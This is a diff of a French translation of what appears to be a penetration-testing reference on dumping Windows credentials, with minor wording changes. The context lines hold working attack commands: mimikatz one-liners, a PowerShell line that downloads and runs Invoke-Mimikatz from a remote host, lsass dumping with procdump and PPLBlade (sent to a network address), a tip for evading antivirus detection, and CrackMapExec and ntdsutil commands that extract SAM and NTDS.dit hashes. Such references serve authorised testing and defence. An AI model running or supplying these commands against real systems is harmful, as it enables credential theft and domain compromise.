@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Découvrez d'autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**
+**Trouvez d'autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Découvrez ici quelques protections possibles des identifiants.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**
+[**Découvrez quelques protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**
 
 ## Identifiants avec Meterpreter
 
-Utilisez le [**Plugin d'Identifiants**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
+Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que j'ai créé pour** **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -67,7 +67,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Remarque**: Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour dumper lsass.exe**, cela est dû au fait qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** comme **argument** le **PID** de lsass.exe à procdump **au lieu de** le **nom lsass.exe.**
+**Remarque**: Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour dumper lsass.exe**, cela est dû au fait qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en tant qu'**argument** le **PID** de lsass.exe à procdump **au lieu de** le **nom lsass.exe.**
 
 ### Dumper lsass avec **comsvcs.dll**
 
@@ -98,19 +98,19 @@ Get-Process -Name LSASS
 ```
 ## Dumping lsass avec PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégé qui prend en charge l'obfuscation des vidages de mémoire et leur transfert sur des stations de travail distantes sans les déposer sur le disque.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégé qui prend en charge l'obfuscation des fichiers de vidage mémoire et leur transfert sur des stations de travail distantes sans les déposer sur le disque.
 
 **Fonctionnalités clés** :
 
 1. Contournement de la protection PPL
-2. Obfuscation des fichiers de vidage de mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
-3. Téléchargement du vidage de mémoire avec des méthodes de téléchargement RAW et SMB sans le déposer sur le disque (vidage sans fichier)
+2. Obfuscation des fichiers de vidage mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
+3. Téléchargement du vidage mémoire avec des méthodes de téléchargement RAW et SMB sans le déposer sur le disque (vidage sans fichier)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 ## CrackMapExec
 
-### Dump des hachages SAM
+### Dump SAM hashes
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -118,12 +118,12 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dump le NTDS.dit du DC cible
+### Dump the NTDS.dit depuis le DC cible
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Dump l'historique des mots de passe NTDS.dit depuis le DC cible
+### Dump the NTDS.dit password history from target DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -133,7 +133,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Vol de SAM & SYSTEM
 
-Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière régulière** car ils sont protégés.
+Ces fichiers devraient être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière régulière** car ils sont protégés.
 
 ### Depuis le Registre
 
@@ -196,7 +196,7 @@ Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-ac
 
 Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, **une partie** du fichier **NTDS.dit** pourrait être localisée **dans la mémoire de `lsass`** (vous pouvez trouver les données récemment accédées probablement à cause de l'amélioration des performances grâce à un **cache**).
 
-#### Décryptage des hashs dans NTDS.dit
+#### Décryptage des hashs à l'intérieur de NTDS.dit
 
 Le hash est chiffré 3 fois :
 
@@ -212,7 +212,7 @@ Disponible depuis Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Vous pouvez également utiliser le [**volume shadow copy**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system)).
+Vous pouvez également utiliser le [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **fichier SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).
 
 ### **Extraction des hashes depuis NTDS.dit**
 
@@ -234,7 +234,7 @@ Les objets NTDS peuvent être extraits vers une base de données SQLite avec [nt
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-La ruche `SYSTEM` est optionnelle mais permet le déchiffrement des secrets (hashes NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, clés kerberos ou de confiance, historiques de mots de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, drapeaux UAC, horodatage du dernier logon et changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et adhésions récursives, arbre des unités organisationnelles et adhésion, domaines de confiance avec type de confiance, direction et attributs...
+Le `SYSTEM` hive est optionnel mais permet le déchiffrement des secrets (NT & LM hashes, informations d'identification supplémentaires telles que les mots de passe en clair, clés kerberos ou de confiance, historiques de mots de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, drapeaux UAC, horodatage pour la dernière connexion et le changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et adhésions récursives, arbre des unités organisationnelles et adhésion, domaines de confiance avec type de confiance, direction et attributs...
 
 ## Lazagne
 
@@ -269,6 +269,6 @@ Téléchargez-le depuis : [ http://www.tarasco.org/security/pwdump_7](http://www
 
 ## Défenses
 
-[**Découvrez ici quelques protections des identifiants.**](credentials-protections.md)
+[**Découvrez quelques protections des identifiants ici.**](credentials-protections.md)
 
 {{#include ../../banners/hacktricks-training.md}}
